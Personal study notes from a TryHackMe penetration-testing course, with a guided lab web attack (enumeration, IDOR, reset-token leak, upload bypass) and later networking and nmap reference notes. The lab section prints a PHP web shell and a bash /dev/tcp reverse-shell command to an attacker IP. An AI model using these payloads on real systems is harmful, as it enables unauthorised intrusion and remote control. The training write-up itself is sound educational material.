
# Here I will be saving important notes, commands, pro tips and secrets of pen testing as I progress through the Jr. Penetration Tester path on Try Hack Me!


## Guided Pen Test: Web


```
TARGET = 10.65.188.103
```

For a thorough enumeration of the target machine:

```bash
nmap -sV -sC -p- 10.65.188.103
```

Results:

```bash
root@ip-10-65-123-23:~# nmap -sC -sV -p- 10.65.188.103
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-06 05:12 UTC
Nmap scan report for ip-10-65-188-103.ec2.internal (10.65.188.103)
Host is up (0.00029s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:cf:4b:27:4e:0b:60:3e:86:c7:97:28:d5:14:5a:25 (ECDSA)
|_  256 1e:1b:42:5a:65:65:68:88:5b:72:6b:7f:95:32:03:c8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: RecruitX - Home
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds

```

The findings show that the target has ports `22 (SSH)`, `80 (http)`,` 3306 (MySQL)` and `8080 (http)` open.
The server is exposing the `SSH`, web server and may also running `SQL` queries in the back.

Now checking the website headers:

```
curl -I http://10.65.188.103/
```

This revealed:

```
xor1@kali:~$ curl -I http://10.65.188.103/
HTTP/1.1 200 OK
Date: Mon, 06 Jul 2026 05:26:45 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=uiucfs0ipgtthtdss9oo558tfn; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

Means the website is using the `LAMP (Linux, Apache, MySQL, and PHP)` stack for deployment and `apache` version is `2.4.58` and its using `PHP` for `Session Management`.

So far we have found this info: The ports, services, architecture and their version numbers.

#### Directory Enumeration:

using Gobuster:

```
gobuster dir -u 10.65.188.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

The results:

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 21600]
/login.php            (Status: 200) [Size: 15107]
/register.php         (Status: 200) [Size: 14802]
/profile.php          (Status: 302) [Size: 0] [--> /login.php]
/jobs.php             (Status: 200) [Size: 27698]
/uploads              (Status: 301) [Size: 316] [--> http://10.65.188.103/uploads/]
/data                 (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.65.188.103/admin/]
/test                 (Status: 200) [Size: 705]
/includes             (Status: 301) [Size: 317] [--> http://10.65.188.103/includes/]
/api                  (Status: 301) [Size: 312] [--> http://10.65.188.103/api/]
/logout.php           (Status: 302) [Size: 0] [--> /login.php]
/config               (Status: 301) [Size: 315] [--> http://10.65.188.103/config/]
/dashboard.php        (Status: 302) [Size: 0] [--> /login.php]
/reset.php            (Status: 200) [Size: 14408]
/.php                 (Status: 403) [Size: 278]
Progress: 175328 / 175330 (100.00%)
```

- `/admin` - An admin panel exists, but it redirects to the login page. We will need credentials to access it.
- `/api` - An API endpoint is present. APIs often expose data in ways the frontend does not.
- `/reset.php` - A password reset page. Reset mechanisms are frequently implemented insecurely.
- `/uploads` - An uploads directory. If we can upload files, this could be a path to code execution.
- `/profile.php` and `/dashboard.php` - These require authentication, so we need to be logged in to access them.

I registered an account successfully on `/register.php` and logged in as `test@mail.com` & `faisal123` as creds.
There I found some links as one of them is `/profile.php`. Exposing the `IDOR`. Moreover I checked the `/api` endpoint and it was exposing `api routes` which was not intended.

checking the api endpoint:

```
curl http://10.64.146.243/api/
```

results:

```shell-session
{"endpoints":["\/api\/user","\/api\/jobs","\/api\/applications"]}
```

## IDOR:

On going to the `/profile` page the `http://10.64.146.243/profile.php?id=6` appears and changing the `id` parameter to `id=1` i got the `Administrator`.

## Weak password reset:

```
http://10.64.146.243/reset.php
```

with the following account proceed:

```
testuser@fake.thm
```

upon giving the email the token is being revealed in the response:

```
s.mitchell@recruitx.thm
```

using that I changed the `Administrator` account and logged in.

Got the admin panel, uploaded the file for RCE. The files are stored in `upload/documents`, it only accepts `pdf`, `images` and `documents`.

The payload:

```
echo '<?php echo "PHP is executing"; ?>' > test.phtml
```

The extension `phtml` was accepted.

Now getting the RCE:

```
<?php if(isset($_GET['cmd'])) { echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; } ?>
```

After uploading the file we can check by executing different commands in the `cmd` parameter:

```
curl "http://10.64.146.243/uploads/documents/shell.phtml?cmd=whoami"
```

now we are going to get the active shell using `netcat` in action.

On our local machine which is the attack box, run the `netcat` listener:

```
nc -lvnp 4444
```

This will be the command we will be embedding in the URL as encoded:

```
bash -c 'bash -i >& /dev/tcp/10.64.81.180/4444 0>&1'
```

encoded:

```
bash+-c+'bash+-i+>%26+/dev/tcp/10.64.81.180/4444+0>%261'
```

**GOT THE SHELLL!**


![](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/Jr.%20Penetration%20Tester/Pasted%20image%2020260708203245.png)


Reading the flag:

```
cat /var/www/flag.txt
```


![](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/Jr.%20Penetration%20Tester/Pasted%20image%2020260708203416.png)

### Summary

| Vulnerability                                | Severity | Remediation                                                                                                                                                                                     |
| -------------------------------------------- | -------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| IDOR on user profiles and API                | High     | Implement server-side authorisation checks on every request. Verify that the authenticated user has permission to access the requested resource.                                                |
| Password reset token exposed in the response | Critical | Send reset tokens exclusively via email. Display only a generic confirmation message on the page. Use cryptographically random tokens of at least 32 characters.                                |
| Incomplete file extension blocklist          | Critical | Use an allowlist rather than a blocklist. Only permit specific, expected extensions. Validate file content (MIME type) in addition to the extension. Store uploaded files outside the web root. |
| API endpoint disclosure                      | Medium   | Remove the API index endpoint or restrict it to authenticated administrators. Do not expose internal route structures to unauthenticated users.                                                 |


---


## Reconnaissance


### Passive Reconn:

- `whois` and `RDAP`
- `nslookup` and `dig`
- `crt.sh` and `DNSdumpster`

> `QUIC` protocol is designed by google that combines the functions of TLS and TCP into a single protocol running on UDP port 443. It is used by modern websites using HTTP/3.


For `Network` tab in `Developer Tools`:

```
CTRL + SHIFT + I
```


```
ICMP Echo Request: type 8
ICMP Echo Response: type 0
```

> `QUIC` used by `HTTP3` combining the capabilities of TLS and TCP over UDP 443.


> When `TTL` reaches `0`  the router drops the packets and sends the `ICMP Time to Live Exceeded` message back to the sender.


> The packets are send by gradually increasing `TTL` values and making the routers reveal the IP addresses one by one by sending back the `ICMP Time to Live Exceeded` until the packet reaches the destination or a maximum `TTL` value is achieved.


> By default on linux `traceroute` sends `UDP` packets, to switch to `TCP` use `traceroute -T IP` and for `ICMP` based, use `traceroute -I IP`.


> Use `mtr IP` for real time continuous view of this `traceroute`.


> Telnet TELETYPE NETWORK -> 23, used for banner grabbing as we can connect because of TCP.


#### SMTP

- Port `25` for MTA to MTA
- Port `587` for MUA to MSA
- Port `465` for SMTPS


#### POP3 (Download and Delete)

- Port `110` for POP3
- Port `995` for POP3S


#### IMAP

- Port 143 for IMAP
- Port 993 for IMAPS


#### Summary

| Protocol | TCP Port | Application(s) | Data Security | Secure Alternative          | Secure Port                   |
| -------- | -------- | -------------- | ------------- | --------------------------- | ----------------------------- |
| FTP      | 21       | File Transfer  | Cleartext     | FTPS or SFTP                | 990 (FTPS), 22 (SFTP)         |
| HTTP     | 80       | Worldwide Web  | Cleartext     | HTTPS                       | 443                           |
| IMAP     | 143      | Email (MDA)    | Cleartext     | IMAPS                       | 993                           |
| POP3     | 110      | Email (MDA)    | Cleartext     | POP3S                       | 995                           |
| SMTP     | 25       | Email (MTA)    | Cleartext     | SMTPS or SMTP with STARTTLS | 465 (SMTPS), 587 (Submission) |
| Telnet   | 23       | Remote Access  | Cleartext     | SSH                         | 22                            |



----



> SSL and TLS are on Presentation Layer


> SSL 2.0 and 3.0 are deprecated. TLS 1.0 and 1.1 are also deprecated. TLS 1.2 and 1.3 can be used on present systems for security.


**Upgrading Protocols with TLS**

An existing cleartext protocol can be upgraded to use encryption via TLS. The following table lists the protocols covered so far and their default ports before and after the encryption upgrade via TLS.

|Protocol|Default Port|Secured Protocol|Default Port with TLS|
|---|---|---|---|
|HTTP|80|HTTPS|443|
|FTP|21|FTPS|990|
|SMTP|25|SMTPS|465|
|POP3|110|POP3S|995|
|IMAP|143|IMAPS|993|

TLS is not limited to web and email protocols. DNS can also be secured using TLS. **DNS over TLS (DoT)** encrypts DNS queries by wrapping standard DNS traffic inside a TLS connection, typically on port 853. A related approach, **DNS over HTTPS (DoH)**, sends DNS queries as HTTPS requests on port 443. Both prevent eavesdropping on DNS lookups, which would otherwise reveal which websites a user is visiting.

## Implicit TLS vs STARTTLS

There are two approaches to adding TLS to a protocol:

**Implicit TLS** uses a dedicated port (as shown in the table above). The connection is encrypted from the start. When you connect to port 443 for HTTPS or port 993 for IMAPS, TLS negotiation begins immediately.

**STARTTLS** allows upgrading an existing cleartext connection to TLS on the same port. The client connects on the standard port (e.g., port 25 for SMTP), and then issues a `STARTTLS` command to upgrade the connection to TLS. This approach is common for email protocols. For SMTP, port 587 (submission) with STARTTLS is the recommended configuration for mail clients.

Both approaches provide encryption. However, implicit TLS is generally preferred because STARTTLS can be vulnerable to downgrade attacks if not properly implemented. An attacker performing a MITM attack could strip the `STARTTLS` command from the communication, forcing the connection to remain in cleartext.




---


#### NMAP


![[Pasted image 20260719211606.png]]




> If the host is in the same network the nmap will use the ARP broadcast to map IPs with the MAC addresses of the hosts.


> If the target is in another subnet or network then the namp will use different IP based probes like ICMP echo request, ICMP timestamp request, TCP SYN, TCP ACK etc...



###### Discovering hosts using different layers of the TCP/IP  OSI layers


![[Pasted image 20260719214127.png]]



> ICMP echo request: type 8
> ICMP echo reply:      type 0


----


> check the number of hosts

```
nmap -sL -n IP
```


> using a list of IPs:

```
nmap -iL nmap.txt
```


> Discover live hosts

```
nmap -sn IP -n
```


-n is for not using the DNS resolution.


> **Nmap host discovery probes:**

for local network ARP broadcast:

```
-PR
```

for remote networks (ICMP Address Mask, ICMP type 8, ICMP timestamp, ACK, SYN and UDP ping): 

```
-PM


-PE


-PP


-PA


-PS


-PU
```


> Address mask request = type 17
> Address mask reply = type 18

ARP scanning is particularly useful during post‑exploitation and internal network enumeration. Once an attacker gains access to a system within a network, ARP scans can be used to quickly and reliably identify other live hosts on the same local segment. Because ARP operates at Layer 2 and is often not filtered by firewalls, it is an effective tool for red-team operations and internal penetration testing.



# ==*"WE HAVE TO DEVELOP BOTH MINDSETS AS AN INTERNAL PENTESTER AND EXTERNAL PENTESTER"*==


Masscan: discover the available systems.


> -R for reverse DNS lookups of hosts even offline, to use a specific DNS server use option:


```
--dns-servers 8.8.8.8
```


---



